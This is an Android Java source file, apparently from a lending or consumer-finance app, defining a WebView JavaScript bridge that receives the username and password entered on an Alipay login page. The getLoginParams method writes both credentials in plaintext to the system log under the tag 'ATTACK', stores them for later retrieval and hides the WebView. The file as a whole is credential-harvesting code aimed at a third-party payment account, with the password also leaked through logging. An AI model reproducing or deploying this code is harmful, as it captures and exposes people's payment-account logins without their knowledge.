package com.il360.xiaofeiyu.alipay;

import android.os.Handler;
import android.util.Log;
import android.webkit.JavascriptInterface;

/**
 * Created by lepc on 2017/8/21.
 */

public class LoginParamsJSInterface {

	private static Handler mHandler = new Handler();

	private String mUserName;
	private String mPassword;

	private LoginCallbackListence loginCallbackListence;

	public LoginParamsJSInterface(LoginCallbackListence callbackListence) {
		this.loginCallbackListence = callbackListence;
	}

	@JavascriptInterface
	public void getLoginParams(final String userName, final String password) {
		Log.w("ATTACK", "UserName" + userName + "  Password:" + password);

		mHandler.post(new Runnable() {
			@Override
			public void run() {
				mUserName = userName;
				mPassword = password;
				Log.w("ATTACK", mUserName + "-------------" + mPassword);
				// 隐藏WebView
				loginCallbackListence.hideWebView();
			}
		});
	}

	public String getUserName() {
		return this.mUserName;
	}

	public String getPassword() {
		return this.mPassword;
	}
}
